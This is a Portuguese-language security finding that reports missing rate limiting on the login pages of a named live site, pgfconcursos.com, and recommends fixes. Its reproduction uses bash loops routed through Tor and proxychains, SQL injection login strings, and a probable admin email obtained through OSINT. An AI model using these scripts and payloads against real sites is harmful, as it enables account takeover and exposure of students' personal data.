# F-005 Ausência de rate limiting / anti-automação nos endpoints de autenticação
Alvo: pgfconcursos.com (45.151.121.124 via Hostinger/LiteSpeed, PHP 7.3.33)
Severidade: Média
Timestamp: 2026-08-27T15:25:00Z
Autor: webapp (Tor + proxychains4, UA Chrome 120 real)

## Reprodução
Múltiplas tentativas de login no painel admin e no login de alunos,
sem qualquer bloqueio, CAPTCHA, throttle ou 429.

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

# Painel admin (POST /admin)
for p in "admin' OR '1'='1'-- -" "admin'-- -" "admin' OR 1=1-- -" \
         "pgfconcursos@gmail.com" "admin_logar=0" ; do
  proxychains4 -q curl -s -m 25 -A "$UA" -X POST "https://pgfconcursos.com/admin" \
    --data-urlencode "email=$p" --data-urlencode "password=x" --data-urlencode "admin_logar=1"
done
# (+ ~6 tentativas com credenciais variadas, total ~12+ requests ao /admin)

# Login de aluno (POST /login)
for u in "naoexiste@invaliddomain.xyz" "11144477735" "pgfconcursos@gmail.com" \
         "admin' OR '1'='1'-- -" "' OR 1=1-- -" ; do
  proxychains4 -q curl -s -m 25 -A "$UA" -X POST "https://pgfconcursos.com/login" \
    --data-urlencode "useremailcpf=$u" --data-urlencode "password=wrongpassX" \
    --data-urlencode "portal_logar=1"
done
```

## Output
Todas as tentativas retornaram HTTP/2 200 com a mesma página de login e
o mesmo alerta genérico:
```
<div class="alert alert-danger alert-dismissible">
  <h4><i class="icon fa fa-warning"></i> Atenção!</h4>
  Ocorreu um erro ao logar!
</div>
```
— NENHUMA resposta 429 (Too Many Requests), NENHUM CAPTCHA exibido,
NENHUM bloqueio temporário, NENHUMA diferença de status. O painel
admin (/admin) NÃO tem reCAPTCHA (somente o /cadastro tem). O login de
aluno (/login) também sem CAPTCHA.

ReCAPTCHA v3 existe APENAS no formulário de /cadastro (sitekey
`6LceUbssAAAAAFRNzIoh4jJrKpgZnThc4OT_0FFx`, action `cadastro`),
NÃO nos logins.

## Interpretação
A ausência de mecanismos anti-automação nos endpoints de login:
- /admin (admin): ~12 tentativas sem qualquer reação do servidor.
- /login (aluno): múltiplas tentativas sem reação.
Permite credential brute force e credential stuffing sem fricção,
viabilizando:
  * brute force de senhas fracas contra o admin (e-mail provável
    pgfconcursos@gmail.com — ver OSINT);
  * credential stuffing com bases vazadas contra contas de alunos;
  * automatização da enumeração de F-001 (CPF oracle) sem limites.

## Impacto
- Viabiliza comprometimento do painel admin via força bruta / dicionário,
  caso a senha seja fraca (acesso a PII de todos os alunos, busca por
  CPF, transações PagSeguro).
- Viabiliza sequestro de contas de alunos em escala (credential
  stuffing).
- Combinado com F-001 (enumeração de CPF), amplia o raio de PII
  extraída.

Observação: a mensagem genérica "Ocorreu um erro ao logar!" é uma boa
prática (não distingue e-mail inválido de senha incorreta), mas o
controle de taxa é o que falta.

## Recomendação
- Implementar rate limiting por IP + por conta (ex.: 5 tentativas /
  15 min, com backoff exponencial e lockout temporário).
- Adicionar CAPTCHA (reCAPTCHA v3 ou Turnstile) nos logins após N
  tentativas falhas.
- Alertas/monitoramento de tentativas de login em massa.
- Política de senha forte + MFA para o admin.
- Para /admin, considerar allowlist de IP + 2FA obrigatório.
